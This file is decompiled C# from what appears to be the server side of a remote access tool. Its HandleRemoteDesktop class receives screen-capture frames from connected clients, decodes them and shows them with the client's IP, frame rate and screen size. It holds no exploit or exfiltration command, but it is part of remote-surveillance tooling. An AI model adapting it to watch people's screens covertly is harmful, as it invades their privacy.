using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.Helper;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200006E RID: 110
	public class HandleRemoteDesktop
	{
		// Token: 0x06000301 RID: 769 RVA: 0x00020B20 File Offset: 0x0001ED20
		public void Capture(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				FormRemoteDesktop formRemoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
				try
				{
					if (formRemoteDesktop != null)
					{
						if (formRemoteDesktop.Client == null)
						{
							formRemoteDesktop.Client = client;
							formRemoteDesktop.labelWait.Visible = false;
							formRemoteDesktop.timer1.Start();
							byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
							Bitmap bitmap = formRemoteDesktop.decoder.DecodeData(new MemoryStream(asBytes));
							formRemoteDesktop.rdSize = bitmap.Size;
							int num = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
							formRemoteDesktop.numericUpDown2.Maximum = num - 1;
						}
						byte[] asBytes2 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
						object syncPicbox = formRemoteDesktop.syncPicbox;
						lock (syncPicbox)
						{
							using (MemoryStream memoryStream = new MemoryStream(asBytes2))
							{
								Bitmap bitmap2 = formRemoteDesktop.decoder.DecodeData(memoryStream);
								formRemoteDesktop.GetImage = bitmap2;
								formRemoteDesktop.rdSize = bitmap2.Size;
							}
							formRemoteDesktop.pictureBox1.Image = formRemoteDesktop.GetImage;
							formRemoteDesktop.FPS++;
							if (formRemoteDesktop.sw.ElapsedMilliseconds >= 1000L)
							{
								Control control = formRemoteDesktop;
								string[] array = new string[14];
								array[0] = "RemoteDesktop:";
								array[1] = client.ID;
								array[2] = "   ";
								array[3] = client.Ip;
								array[4] = ":";
								array[5] = client.TcpClient.LocalEndPoint.ToString().Split(new char[]
								{
									':'
								})[1];
								array[6] = "   FPS:";
								int num2 = 7;
								int fps = formRemoteDesktop.FPS;
								array[num2] = fps.ToString();
								array[8] = "   Screen:";
								array[9] = formRemoteDesktop.GetImage.Width.ToString();
								array[10] = " x ";
								array[11] = formRemoteDesktop.GetImage.Height.ToString();
								array[12] = "   Size:";
								array[13] = Methods.BytesToString((long)asBytes2.Length);
								control.Text = string.Concat(array);
								formRemoteDesktop.FPS = 0;
								formRemoteDesktop.sw = Stopwatch.StartNew();
							}
						}
					}
					else
					{
						client.Disconnected();
					}
				}
				catch (Exception)
				{
				}
			}
			catch
			{
			}
		}
	}
}
